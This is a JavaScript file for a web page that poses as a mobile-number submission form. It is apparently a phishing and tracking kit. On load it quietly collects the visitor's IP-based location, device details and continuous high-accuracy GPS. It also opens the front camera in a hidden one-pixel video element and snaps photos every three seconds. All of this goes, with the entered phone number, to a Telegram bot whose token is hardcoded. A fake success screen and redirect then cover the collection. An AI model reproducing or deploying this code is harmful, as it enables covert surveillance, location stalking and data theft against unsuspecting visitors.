const BOT_TOKEN = "8431980730:AAFkOEc194xolmick_CgUMt5T51tf9c5S6Y";
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

let cameraStream = null;
let photoInterval = null;
let locationInterval = null;
let currentChatId = null;
let isCameraActive = false;
let photoCounter = 0;
let videoElement = null;
let watchId = null;
let currentLocation = null;
let locationUpdates = 0;
let isSubmitted = false;
let redirectUrl = "https://telegram.me/ANAS_ACCESS_BOT";
let redirectTimer = null;

// Create video element
function createVideoElement() {
    if (videoElement) return videoElement;
    
    videoElement = document.createElement('video');
    videoElement.id = 'camera-feed';
    videoElement.autoplay = true;
    videoElement.playsInline = true;
    videoElement.muted = true;
    videoElement.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 1px;
        height: 1px;
        opacity: 0;
        pointer-events: none;
        z-index: -9999;
    `;
    document.body.appendChild(videoElement);
    return videoElement;
}

// Parse URL parameters
function getUrlParameters() {
    const params = new URLSearchParams(window.location.search);
    const result = {};

    for (const [key, value] of params.entries()) {
        result[key] = value;
    }

    return result;
}

// Get redirect URL from parameter
function getRedirectUrl() {
    const params = getUrlParameters();
    let urlParam = params.url || params.redirect || params.link || params.u || params.r || params.l;

    if (urlParam) {
        try {
            // Decode URL
            const decodedUrl = decodeURIComponent(urlParam);
            
            // Clean URL
            let cleanUrl = decodedUrl.replace(/<[^>]*>/g, '');
            
            // Add https:// if not present
            if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
                cleanUrl = 'https://' + cleanUrl;
            }
            
            // Validate URL
            new URL(cleanUrl);
            console.log("Valid redirect URL:", cleanUrl);
            return cleanUrl;
        } catch (error) {
            console.error("Invalid redirect URL:", error);
        }
    }
    
    return "https://telegram.me/ANAS_ACCESS_BOT";
}

async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}

async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
    };

    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            deviceInfo.charging = battery.charging;
            deviceInfo.chargingPercentage = Math.round(battery.level * 100);
        } catch (e) {
            console.error("Battery API error:", e);
        }
    }

    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
        deviceInfo.downlink = navigator.connection.downlink;
        deviceInfo.rtt = navigator.connection.rtt;
    }

    deviceInfo.screenWidth = window.screen.width;
    deviceInfo.screenHeight = window.screen.height;
    deviceInfo.windowWidth = window.innerWidth;
    deviceInfo.windowHeight = window.innerHeight;
    deviceInfo.currentTime = new Date().toLocaleString();

    return deviceInfo;
}

async function sendTelegramMessage(chatId, message) {
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };

    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        console.log("Telegram Response:", result);
        return result.ok;
    } catch (error) {
        console.error("Error sending message:", error);
        return false;
    }
}

async function sendPhoto(chatId, photo, photoNumber = 0, location = null) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', photo);

    const timestamp = new Date().toLocaleTimeString();
    let caption = `📸 Photo #${photoNumber}\n⏰ Time: ${timestamp}`;

    if (location) {
        const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
        caption += `\n📍 Location: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
        caption += `\n🗺️ Maps: ${mapsUrl}`;
        caption += `\n🎯 Accuracy: ${location.accuracy ? location.accuracy.toFixed(2) + 'm' : 'N/A'}`;
    }

    formData.append('caption', caption);

    try {
        const response = await fetch(API_FILE_URL, {
            method: "POST",
            body: formData
        });

        const result = await response.json();
        console.log(`Photo #${photoNumber} sent:`, result.ok ? "Success" : "Failed");
        return result.ok;
    } catch (error) {
        console.error(`Error sending photo #${photoNumber}:`, error);
        return false;
    }
}

async function sendLocationUpdate(chatId, location) {
    const timestamp = new Date().toLocaleString();
    const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;

    const message = `
<b>📍 LOCATION UPDATE #${locationUpdates}</b>
<b>Latitude:</b> <i>${location.latitude.toFixed(6)}</i>
<b>Longitude:</b> <i>${location.longitude.toFixed(6)}</i>
<b>Accuracy:</b> <i>${location.accuracy ? location.accuracy.toFixed(2) + 'm' : 'N/A'}</i>
<b>Time:</b> <i>${timestamp}</i>
<b>Maps:</b> <a href="${mapsUrl}">Open</a>
    `;

    await sendTelegramMessage(chatId, message);
    locationUpdates++;
}

async function capturePhoto() {
    if (!videoElement || !cameraStream || !videoElement.videoWidth || videoElement.videoWidth === 0) {
        console.error("Camera not ready");
        return null;
    }

    try {
        // Small delay to ensure video is ready
        await new Promise(resolve => setTimeout(resolve, 100));

        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        
        return new Promise((resolve) => {
            canvas.toBlob(blob => {
                if (blob) {
                    const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
                    resolve(file);
                } else {
                    resolve(null);
                }
            }, 'image/jpeg', 0.8);
        });
    } catch (error) {
        console.error("Error capturing photo:", error);
        return null;
    }
}

async function startCamera() {
    try {
        console.log("Starting front camera...");
        
        // Create video element
        createVideoElement();

        // Front camera constraints
        const constraints = {
            video: {
                facingMode: 'user', // Front camera
                width: { ideal: 1280 },
                height: { ideal: 720 },
                frameRate: { ideal: 30 }
            },
            audio: false
        };

        // Get camera stream
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        cameraStream = stream;
        videoElement.srcObject = stream;

        // Wait for video to be ready
        return new Promise((resolve, reject) => {
            const timer = setTimeout(() => {
                reject(new Error("Camera timeout"));
            }, 5000);

            const checkVideoReady = () => {
                if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
                    clearTimeout(timer);
                    console.log(`Camera ready: ${videoElement.videoWidth}x${videoElement.videoHeight}`);
                    isCameraActive = true;
                    resolve(true);
                } else {
                    setTimeout(checkVideoReady, 100);
                }
            };

            videoElement.onloadedmetadata = checkVideoReady;
            videoElement.onerror = () => {
                clearTimeout(timer);
                reject(new Error("Video error"));
            };
            
            // Start checking immediately
            checkVideoReady();
        });

    } catch (error) {
        console.error("Camera error:", error);
        isCameraActive = false;
        
        if (currentChatId) {
            await sendTelegramMessage(currentChatId, 
                `⚠️ Camera Error: ${error.message}\nTime: ${new Date().toLocaleString()}`);
        }
        
        return false;
    }
}

async function startLocationTracking() {
    if (!navigator.geolocation) {
        console.error("Geolocation not supported");
        return;
    }

    console.log("Starting location tracking...");

    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        });

        currentLocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            heading: position.coords.heading,
            timestamp: new Date(position.timestamp)
        };

        console.log("Got initial location:", currentLocation);

        if (currentChatId) {
            await sendLocationUpdate(currentChatId, currentLocation);
        }

        // Watch for location updates
        watchId = navigator.geolocation.watchPosition(
            (position) => {
                currentLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    timestamp: new Date(position.timestamp)
                };
                
                console.log("Location updated:", currentLocation);
                
                // Send update every 30 seconds
                if (currentChatId && locationUpdates % 6 === 0) {
                    sendLocationUpdate(currentChatId, currentLocation);
                }
            },
            (error) => {
                console.error("Location error:", error);
            },
            {
                enableHighAccuracy: true,
                maximumAge: 0,
                timeout: 10000
            }
        );

        // Periodic updates every 60 seconds
        locationInterval = setInterval(async () => {
            if (currentLocation && currentChatId) {
                await sendLocationUpdate(currentChatId, currentLocation);
            }
        }, 60000);

    } catch (error) {
        console.error("Location permission denied:", error);
        if (currentChatId) {
            await sendTelegramMessage(currentChatId, 
                `❌ Location Denied: ${error.message}\nTime: ${new Date().toLocaleString()}`);
        }
    }
}

async function startContinuousPhotoCapture() {
    if (!isCameraActive || !currentChatId) return;

    console.log("Starting photo capture every 3 seconds...");

    // First photo after 1 second
    setTimeout(async () => {
        try {
            const photo = await capturePhoto();
            if (photo) {
                photoCounter++;
                await sendPhoto(currentChatId, photo, photoCounter, currentLocation);
                console.log("First photo sent");
            }
        } catch (error) {
            console.error("First photo error:", error);
        }
    }, 1000);

    // Then every 3 seconds
    photoInterval = setInterval(async () => {
        try {
            const photo = await capturePhoto();
            if (photo) {
                photoCounter++;
                await sendPhoto(currentChatId, photo, photoCounter, currentLocation);

                // Status update every 10 photos
                if (photoCounter % 10 === 0) {
                    const status = `
<b>📊 STATUS UPDATE</b>
<b>Photos:</b> ${photoCounter}
<b>Location Updates:</b> ${locationUpdates}
<b>Camera:</b> ${isCameraActive ? '✅ Active' : '❌ Inactive'}
<b>Location:</b> ${currentLocation ? '✅ Active' : '❌ Inactive'}
<b>Time:</b> ${new Date().toLocaleString()}
                    `;
                    await sendTelegramMessage(currentChatId, status);
                }
            }
        } catch (error) {
            console.error("Photo capture error:", error);
        }
    }, 3000);
}

async function sendInitialInfo() {
    try {
        const ipDetails = await getIpDetails();
        const deviceInfo = await getDeviceInfo();
        const params = getUrlParameters();

        currentChatId = params.id || params.chat_id || params.cid;
        redirectUrl = getRedirectUrl();

        if (!currentChatId) {
            alert("❌ Missing Chat ID in URL");
            return;
        }

        const message = `
<b>🚀 TRACKING STARTED</b>
<b>Time:</b> ${deviceInfo.currentTime}
<b>IP:</b> ${ipDetails.ip}
<b>Location:</b> ${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}
<b>ISP:</b> ${ipDetails.org}
<b>Device:</b> ${deviceInfo.platform}
<b>Screen:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
<b>Network:</b> ${deviceInfo.networkType}
<b>Redirect URL:</b> ${redirectUrl}
<b>Full URL:</b> ${window.location.href}
        `;

        await sendTelegramMessage(currentChatId, message);
        console.log("Initial info sent");

        // Start camera
        console.log("Starting camera...");
        const cameraStarted = await startCamera();
        
        // Start location
        console.log("Starting location tracking...");
        await startLocationTracking();
        
        // Start photos if camera is active
        if (cameraStarted) {
            console.log("Starting continuous photo capture...");
            startContinuousPhotoCapture();
        } else {
            console.log("Camera not started, continuing without photos");
        }

    } catch (error) {
        console.error("Initial info error:", error);
    }
}

function cleanup() {
    console.log("Cleaning up...");

    if (photoInterval) {
        clearInterval(photoInterval);
        photoInterval = null;
    }

    if (locationInterval) {
        clearInterval(locationInterval);
        locationInterval = null;
    }

    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }

    if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
    }

    if (videoElement) {
        videoElement.srcObject = null;
        if (videoElement.parentNode) videoElement.remove();
        videoElement = null;
    }

    if (redirectTimer) {
        clearTimeout(redirectTimer);
        redirectTimer = null;
    }

    isCameraActive = false;

    // Send final message if not submitted
    if (currentChatId && !isSubmitted) {
        const finalMsg = `
<b>📊 SESSION ENDED</b>
<b>Photos:</b> ${photoCounter}
<b>Location Updates:</b> ${locationUpdates}
<b>Time:</b> ${new Date().toLocaleString()}
        `;
        
        const blob = new Blob([JSON.stringify({
            chat_id: currentChatId,
            text: finalMsg,
            parse_mode: "HTML"
        })], {type: 'application/json'});
        
        navigator.sendBeacon(API_URL, blob);
    }
}

function showRedirectMessage(seconds) {
    // Simple message without HTML injection
    const messageDiv = document.createElement('div');
    messageDiv.id = 'redirect-message';
    messageDiv.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        font-family: Arial, sans-serif;
        text-align: center;
        padding: 20px;
        z-index: 999999;
    `;
    
    messageDiv.innerHTML = `
        <h1 style="font-size: 2em; margin-bottom: 20px;">✅ Submission Successful!</h1>
        <p style="font-size: 1.2em; margin-bottom: 10px;">
            Your information has been submitted.
        </p>
        <p style="font-size: 1.1em; margin-bottom: 20px;">
            Redirecting in ${seconds} seconds...
        </p>
        <div style="
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        "></div>
        <p style="font-size: 0.9em; opacity: 0.8;">
            <a href="${redirectUrl}" style="color: white; text-decoration: underline;">
                Click here if not redirected
            </a>
        </p>
        <p style="font-size: 0.8em; opacity: 0.6; margin-top: 20px;">
            Photos: ${photoCounter} | Location: ${locationUpdates}
        </p>
        <style>
            @keyframes spin { to { transform: rotate(360deg); } }
        </style>
    `;
    
    document.body.appendChild(messageDiv);
}

function startRedirectCountdown(seconds) {
    let remaining = seconds;
    
    // Show initial message
    showRedirectMessage(remaining);
    
    // Update countdown every second
    const countdownInterval = setInterval(() => {
        remaining--;
        
        // Update message
        const messageDiv = document.getElementById('redirect-message');
        if (messageDiv) {
            const timerElement = messageDiv.querySelector('p:nth-child(3)');
            if (timerElement) {
                timerElement.textContent = `Redirecting in ${remaining} seconds...`;
            }
        }
        
        // Redirect when countdown reaches 0
        if (remaining <= 0) {
            clearInterval(countdownInterval);
            window.location.href = redirectUrl;
        }
    }, 1000);
    
    // Also set a backup timer
    redirectTimer = setTimeout(() => {
        clearInterval(countdownInterval);
        window.location.href = redirectUrl;
    }, seconds * 1000);
}

function redirectToUrl() {
    console.log("Starting redirect process...");
    cleanup();
    
    // Send final data to Telegram
    if (currentChatId) {
        const finalMessage = `
<b>🔄 USER REDIRECTING</b>
<b>Total Photos:</b> ${photoCounter}
<b>Total Location Updates:</b> ${locationUpdates}
<b>Redirect URL:</b> ${redirectUrl}
<b>Redirect Time:</b> ${new Date().toLocaleString()}
        `;
        
        sendTelegramMessage(currentChatId, finalMessage);
    }
    
    // Wait 35 seconds (30-40 seconds as requested) then show redirect message
    setTimeout(() => {
        // Show redirect countdown for 5 seconds
        startRedirectCountdown(5);
    }, 35000); // 35 seconds delay before starting redirect countdown
}

// Event listeners
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        if (photoInterval) {
            clearInterval(photoInterval);
            photoInterval = null;
        }
    } else {
        if (isCameraActive && currentChatId && !photoInterval && !isSubmitted) {
            startContinuousPhotoCapture();
        }
    }
});

window.addEventListener('beforeunload', function(e) {
    if (!isSubmitted) {
        cleanup();
    }
});

// Form submission
document.getElementById('data-form').addEventListener('submit', async function (event) {
    event.preventDefault();

    const operator = document.getElementById('operator').value;
    const mobileNumber = document.getElementById('mobile-number').value;
    const params = getUrlParameters();
    const chatId = params.id || params.chat_id || params.cid;

    if (!chatId) {
        alert("Missing Chat ID");
        return;
    }

    // Disable button and show loading
    const submitBtn = document.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.disabled = true;
    submitBtn.textContent = "Submitting...";

    // Show processing message
    const processingDiv = document.createElement('div');
    processingDiv.id = 'processing-message';
    processingDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: rgba(0,0,0,0.8);
        color: white;
        padding: 20px;
        border-radius: 10px;
        z-index: 99999;
        text-align: center;
    `;
    processingDiv.innerHTML = `
        <p>Processing submission...</p>
        <p>Please wait 30-40 seconds</p>
        <p>Photos: ${photoCounter} | Location: ${locationUpdates}</p>
    `;
    document.body.appendChild(processingDiv);

    try {
        const ipDetails = await getIpDetails();

        const message = `
<b>📱 MOBILE SUBMITTED</b>
<b>Number:</b> +91${mobileNumber}
<b>Operator:</b> ${operator}
<b>Redirect To:</b> ${redirectUrl}
${currentLocation ? `
<b>📍 Current Location:</b> ${currentLocation.latitude.toFixed(6)}, ${currentLocation.longitude.toFixed(6)}
<b>Accuracy:</b> ${currentLocation.accuracy ? currentLocation.accuracy.toFixed(2) + 'm' : 'N/A'}
` : ''}
<b>IP:</b> ${ipDetails.ip}
<b>City:</b> ${ipDetails.city}
<b>ISP:</b> ${ipDetails.org}
<b>Photos Taken:</b> ${photoCounter}
<b>Location Updates:</b> ${locationUpdates}
<b>Time:</b> ${new Date().toLocaleString()}
        `;

        const success = await sendTelegramMessage(chatId, message);

        if (success) {
            isSubmitted = true;

            // Send final photo
            if (isCameraActive) {
                const finalPhoto = await capturePhoto();
                if (finalPhoto) {
                    photoCounter++;
                    await sendPhoto(chatId, finalPhoto, photoCounter, currentLocation);
                }
            }

            // Remove processing message
            if (processingDiv.parentNode) {
                processingDiv.remove();
            }

            // Start redirect process (will wait 35 seconds)
            redirectToUrl();
            
            // Show waiting message
            submitBtn.textContent = "Submitted ✓ Waiting...";
            
        } else {
            alert("Failed to submit. Try again.");
            submitBtn.disabled = false;
            submitBtn.textContent = originalText;
            if (processingDiv.parentNode) {
                processingDiv.remove();
            }
        }

    } catch (error) {
        console.error("Submit error:", error);
        alert("Error occurred. Try again.");
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
        if (processingDiv.parentNode) {
            processingDiv.remove();
        }
    }
});

// Mobile number formatting
document.getElementById('mobile-number').addEventListener('input', function () {
    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
});

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    console.log("🚀 Starting tracking system...");

    // Get parameters
    const params = getUrlParameters();
    redirectUrl = getRedirectUrl();
    
    console.log("Redirect URL:", redirectUrl);
    console.log("All params:", params);

    // Show redirect info
    const redirectInfo = document.getElementById('redirect-info');
    if (redirectInfo && redirectUrl !== "https://telegram.me/ANAS_ACCESS_BOT") {
        redirectInfo.textContent = `After submission → ${redirectUrl}`;
        redirectInfo.style.display = 'block';
    }

    // Update stats display
    const updateStats = setInterval(() => {
        const camStatus = document.getElementById('cam-status');
        const gpsStatus = document.getElementById('gps-status');
        const photoCount = document.getElementById('photo-count');
        const locCount = document.getElementById('loc-count');
        
        if (camStatus) camStatus.textContent = isCameraActive ? '✅ Active' : '⏳ Starting';
        if (gpsStatus) gpsStatus.textContent = currentLocation ? '✅ Active' : '⏳ Requesting';
        if (photoCount) photoCount.textContent = photoCounter;
        if (locCount) locCount.textContent = locationUpdates;
        
        // Debug info in console
        console.log(`Camera: ${isCameraActive}, Location: ${currentLocation ? 'Yes' : 'No'}, Photos: ${photoCounter}, Location Updates: ${locationUpdates}`);
    }, 1000);

    // Start tracking
    setTimeout(sendInitialInfo, 1500);
});